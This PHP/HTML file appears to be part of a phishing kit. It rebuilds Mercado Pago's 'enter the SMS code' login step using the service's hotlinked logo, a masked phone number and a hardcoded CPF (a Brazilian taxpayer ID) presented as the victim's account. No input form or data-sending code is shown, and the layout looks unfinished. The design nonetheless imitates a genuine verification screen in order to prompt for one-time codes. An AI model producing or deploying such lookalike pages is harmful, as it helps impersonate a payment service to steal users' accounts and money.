<?php
// --- DADOS DO CLIENTE (EXEMPLO) ---
$identificador_cliente = '28811419867';
$tipo_identificador = 'CPF'; 

// Função para formatar o CPF
function formatarCPF($cpf) {
    $cpf = preg_replace('/[^0-9]/', '', $cpf);
    if (strlen($cpf) != 11) {
        return "CPF inválido";
    }
    return substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insira o código SMS</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f5f5f5;
            color: #333;
        }

        .main-header {
            background-color: #ffe600;
            height: 60px;
            display: flex;
            align-items: center;
            /* O padding é ajustado para alinhar com o conteúdo abaixo */
            padding: 0 48px; 
        }

        .main-header img {
            height: 37px;
        }

        /* Container principal para alinhar o conteúdo */
        .main-content {
            padding-top: 80px;
            flex-grow: 1; /* Garante que o main ocupe o espaço disponível */
        }
        
        /* NOVO: Wrapper para centralizar o layout de colunas */
        .content-wrapper {
            max-width: 960px; /* Largura máxima do conteúdo total */
            margin: 0 auto; /* Centraliza o wrapper na página */
            display: flex; /* Ativa flexbox */
            justify-content: center; /* Centraliza as colunas filhas */
            gap: 64px; /* Espaço entre a coluna da esquerda e a futura da direita */
        }

        /* Estilos para a coluna da esquerda */
        .left-column {
            width: 340px; /* Largura fixa para a coluna de texto */
            flex-shrink: 0; /* Impede que a coluna encolha */
        }

        .session-start-label {
            font-size: 12px;
            font-weight: 600;
            color: #666;
            text-transform: uppercase;
        }

        .main-title {
            font-size: 28px;
            font-weight: 400;
            margin: 8px 0 16px 0;
        }

        .description-text {
            font-size: 16px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .user-info-box {
            /* MUDANÇA: inline-flex faz a caixa se ajustar ao conteúdo */
            display: inline-flex; 
            align-items: center;
            gap: 12px;
            border: 1px solid #e0e0e0;
            border-radius: 25px; /* Bordas arredondadas */
            padding: 12px;
            margin-bottom: 24px;
        }

        .user-info-box .icon {
            width: 32px;
            height: 32px;
            background-color: #eaf3ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .user-info-box .details span {
            display: block;
            font-size: 14px;
            color: #333;
        }

        .user-info-box .details a {
            font-size: 12px;
            color: #3483fa;
            text-decoration: none;
        }

        .help-link {
            color: #3483fa;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
                <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>

                <div class="user-info-box">
                    <div class="icon">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </div>
                    <div class="details">
                        <span><?php echo $tipo_identificador . ': ' . formatarCPF($identificador_cliente); ?></span>
                        <a href="#">Trocar conta</a>
                    </div>
                </div>

                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            </div>
    </main>

</body>
</html>